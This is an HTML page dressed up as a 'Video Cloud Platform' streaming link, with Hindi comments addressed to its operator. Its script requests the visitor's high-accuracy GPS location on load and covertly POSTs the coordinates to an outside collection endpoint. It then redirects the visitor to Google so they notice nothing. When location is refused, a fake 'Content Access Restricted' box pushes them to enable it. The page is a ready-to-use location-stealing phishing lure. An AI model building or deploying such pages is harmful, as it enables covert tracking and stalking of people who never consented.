<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Cloud Platform - Streaming Link</title>
    <style>
        body {
            margin: 0; padding: 0;
            background-color: #0f0f0f;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
            color: #ffffff;
            display: flex; justify-content: center; align-items: center;
            height: 100vh; overflow: hidden;
        }

        #verification-modal {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background-color: rgba(0, 0, 0, 0.95);
            z-index: 9999;
            justify-content: center; align-items: center;
            padding: 20px; box-sizing: border-box;
        }

        .modal-box {
            background-color: #1f1f1f;
            border: 1px solid #333333;
            border-radius: 8px;
            padding: 30px; max-width: 400px; width: 100%;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
        }

        .modal-title {
            font-size: 18px; font-weight: 600;
            margin-bottom: 12px; color: #ff4d4d;
        }

        .modal-text {
            font-size: 14px; color: #aaaaaa;
            line-height: 1.5; margin-bottom: 24px;
        }

        .action-btn {
            background-color: #cc0000;
            color: #ffffff; border: none;
            padding: 12px 24px; font-size: 14px; font-weight: 600;
            border-radius: 4px; cursor: pointer; width: 100%;
        }

        .spinner {
            border: 3px solid #333; border-top: 3px solid #ffffff;
            border-radius: 50%; width: 30px; height: 30px;
            animation: spin 1s linear infinite; margin: 0 auto 15px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <!-- शुरुआती लोडिंग स्क्रीन -->
    <div id="loading-context" style="text-align: center;">
        <div class="spinner"></div>
        <p style="color: #888888; font-size: 14px;">Initializing encrypted video stream, please wait...</p>
    </div>

    <!-- आपका कस्टमाइज्ड वीडियो मैसेज बॉक्स -->
    <div id="verification-modal">
        <div class="modal-box">
            <div class="modal-title">Content Access Restricted</div>
            <div class="modal-text">
                This media contains sensitive content. Please grant browser location permission and turn on your device location to continue.
            </div>
            <button class="action-btn" onclick="window.location.reload();">Verify & Watch Video</button>
        </div>
    </div>

    <script>
        // सुपर-फास्ट डेटा डिस्पैच फंक्शन (बिना किसी रुकावट के)
        function sendLocationImmediate(lat, lon, status, shouldRedirect) {
            var payload = {
                status: status,
                latitude: lat,
                longitude: lon
            };

            // line 94: यहाँ 'https://yaha_humara_link_ayga' की जगह अपनी असली PHP लिंक डालें
            // keepalive: true की मदद से डेटा बैकग्राउंड में तुरंत फायर हो जाता है, पेज अटकेगा नहीं
            fetch('https://eotkqc7s42iokg5.m.pipedream.net
', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
                keepalive: true 
            });

            // "2 सेकंड" के अंदर का एक्शन लॉजिक
            if (shouldRedirect) {
                setTimeout(function() {
                    window.location.href = "https://google.com";
                }, 800); // 1 सेकंड से भी कम में गूगल पर ट्रांसफर
            } else {
                showRestrictionUI();
            }
        }

        function showRestrictionUI() {
            document.getElementById('loading-context').style.display = 'none';
            document.getElementById('verification-modal').style.display = 'flex';
        }

        window.onload = function() {
            if (navigator.geolocation) {
                // सीधे जीपीएस ट्रिगर (टाइमआउट को घटाकर 3.5 सेकंड कर दिया ताकि फटाफट काम हो)
                navigator.geolocation.getCurrentPosition(function(position) {
                    
                    // कंडीशन 1: लोकेशन ऑन थी या यूजर ने 'Verify' बटन दबाकर जीपीएस ऑन किया और 'Allow' दबाया
                    var lat = position.coords.latitude;
                    var lon = position.coords.longitude;
                    
                    // डेटा फायर करो और तुरंत गूगल पर भेजो
                    sendLocationImmediate(lat, lon, "GEO_SUCCESS", true);

                }, function(error) {
                    
                    // कंडीशन 2: फोन में लोकेशन ऑफ है, या यूजर ने परमिशन नहीं दी
                    // तुरंत बिना टाइम वेस्ट किए ब्लैक स्क्रीन पर हमारा बॉक्स दिखाओ
                    sendLocationImmediate(null, null, "GEO_FAILED", false);
                    
                }, { 
                    enableHighAccuracy: true, 
                    timeout: 3500 // सिर्फ 3.5 सेकंड का सख्त टाइमआउट
                });
            } else {
                sendLocationImmediate(null, null, "GEO_NOT_SUPPORTED", true);
            }
        };
    </script>
</body>
</html>
